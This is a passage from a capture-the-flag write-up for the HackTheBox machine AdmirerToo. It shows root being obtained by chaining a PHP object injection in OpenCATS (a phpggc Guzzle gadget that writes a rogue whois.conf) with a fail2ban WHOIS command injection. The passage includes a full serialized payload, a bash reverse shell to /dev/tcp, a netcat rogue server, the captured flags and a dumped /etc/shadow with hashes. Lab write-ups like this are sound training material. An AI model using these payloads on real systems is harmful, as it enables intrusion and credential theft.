To exploit the vulnerability we must have control on whois output. Luckly **opencats** run with devel privileges and is vulnerable to PHP Object Injectionm leading to arbitrary file write. Devel has write privileges on `/usr/local/etc`, a secondary directory for configuration files, and so he can write here an arbitrary **whois.conf** that can be used to exploit the RCE in fail2ban

```bash
jennifer@admirertoo:/opt/opencats$ ls -ald /usr/local/etc
drwxrwxr-x 2 root devel 4096 Jul  7  2021 /usr/local/etc
```

Because the PHP deserialization writes json, we need to craft a specific POP gadget to write a clean conf file:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/AdmirerToo]
└─$ echo '}]|. [10.10.14.2]' > /tmp/payload

┌──(kali㉿kali)-[~/CTFs/HTB/B2R/AdmirerToo]
└─$ phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf /tmp/payload
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A19%3A%22%7D%5D%7C.+%5B10.10.14.18%5D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D
```

Exploited the PHP Object Injection and wrote the conf file:

```
GET /index.php?m=activity&parametersactivity%3AActivityDataGrid=a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A19%3A%22%7D%5D%7C.+%5B10.10.14.18%5D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: CATS=rsiut3ufujk9etpjqesshnchfr
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```

```bash
jennifer@admirertoo:~$ ls /usr/local/etc/
jennifer@admirertoo:~$ ls /usr/local/etc/
whois.conf
jennifer@admirertoo:~$ cat /usr/local/etc/whois.conf
[{"Expires":1,"Discard":false,"Value":"}]|. [10.10.14.2]\n"}]
```

Preparing and testing the WHOIS rogue server:

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/AdmirerToo/exploit]
└─$ echo '~| bash -c "bash -i >& /dev/tcp/10.10.14.2/10099 0>&1" &' > fail2ban-rev.sh

┌──(kali㉿kali)-[~/…/HTB/B2R/AdmirerToo/exploit]
└─$ sudo nc -nvlkp 43 -c "cat fail2ban-rev.sh"
[sudo] password for kali:
listening on [any] 43 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.137] 52964
```

```bash
jennifer@admirertoo:~$ whois 10.10.14.2
~| bash -c "bash -i >& /dev/tcp/10.10.14.2/10099 0>&1" &
fgets: Connection reset by peer
```

Now we can force fail2ban into banning our IP in order to send an email to root (with root privileges) containing out malicious payload and obtaining RCE.

Rogue WHOIS server:

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/AdmirerToo/exploit]
└─$ sudo nc -nvlkp 43 -c "cat fail2ban-rev.sh"
[sudo] password for kali: 
listening on [any] 43 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.137] 52976
```

Attempting to get banned:

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/AdmirerToo/exploit]
└─$ ssh jennifer@admirertoo.htb
ssh: connect to host admirertoo.htb port 22: Connection refused
                                                                                                                    
┌──(kali㉿kali)-[~/…/HTB/B2R/AdmirerToo/exploit]
└─$ ssh jennifer@admirertoo.htb
jennifer@admirertoo.htb's password: 
Permission denied, please try again.
jennifer@admirertoo.htb's password: 
Permission denied, please try again.
jennifer@admirertoo.htb's password: 
jennifer@admirertoo.htb: Permission denied (publickey,password).
                                                                                                                    
┌──(kali㉿kali)-[~/…/HTB/B2R/AdmirerToo/exploit]
└─$ ssh jennifer@admirertoo.htb
ssh: connect to host admirertoo.htb port 22: Connection refused
...
```

Reverse shell:

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/AdmirerToo/exploit]
└─$ nc -nlvp 10099
listening on [any] 10099 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.137] 34928
bash: cannot set terminal process group (14620): Inappropriate ioctl for device
bash: no job control in this shell
root@admirertoo:/# id && cat ~/root.txt && hostname
id && cat ~/root.txt && hostname
uid=0(root) gid=0(root) groups=0(root)
54f21ac1641a6ec72be23bdfd993c1c1
admirertoo
root@admirertoo:/# 
```

# Trophy

>**User.txt**
>c171776485c8d1852be98f88edbba763

>**Root.txt**
>54f21ac1641a6ec72be23bdfd993c1c1

**/etc/shadow**

```bash
root@admirertoo:/# cat /etc/shadow
cat /etc/shadow
root:$6$eP5MVyB1lXtVQgzU$H4xJdGiHfSu9JmUR80juqHC5BAca79yir2Z6bipW8s.DowTuNRo82/CjN7EMBK8lczD1AMYxgKTIp79DjN2R31:18817:0:99999:7:::
daemon:*:18815:0:99999:7:::
bin:*:18815:0:99999:7:::
sys:*:18815:0:99999:7:::
sync:*:18815:0:99999:7:::
games:*:18815:0:99999:7:::
man:*:18815:0:99999:7:::
lp:*:18815:0:99999:7:::
mail:*:18815:0:99999:7:::
news:*:18815:0:99999:7:::
uucp:*:18815:0:99999:7:::
proxy:*:18815:0:99999:7:::
www-data:*:18815:0:99999:7:::
backup:*:18815:0:99999:7:::
list:*:18815:0:99999:7:::
irc:*:18815:0:99999:7:::
gnats:*:18815:0:99999:7:::
nobody:*:18815:0:99999:7:::
_apt:*:18815:0:99999:7:::
systemd-timesync:*:18815:0:99999:7:::
systemd-network:*:18815:0:99999:7:::
systemd-resolve:*:18815:0:99999:7:::
messagebus:*:18815:0:99999:7:::
systemd-coredump:!!:18815::::::
opentsdb:*:18815:0:99999:7:::
hbase:!:18815:0:99999:7:::
mysql:!:18816:0:99999:7:::
jennifer:$6$LWi8tlOmIOw6zGZa$A5h4DjTnRwW3GhZnA288bi4zKk892yRGon5kBhKao3biY8AWo3.qTFdlEIAPJ.ebKewW31JWbbXlpl/r.aLIC/:18817:0:99999:7:::
sshd:*:18816:0:99999:7:::
Debian-exim:!:18827:0:99999:7:::
devel:!:18829:0:99999:7:::
```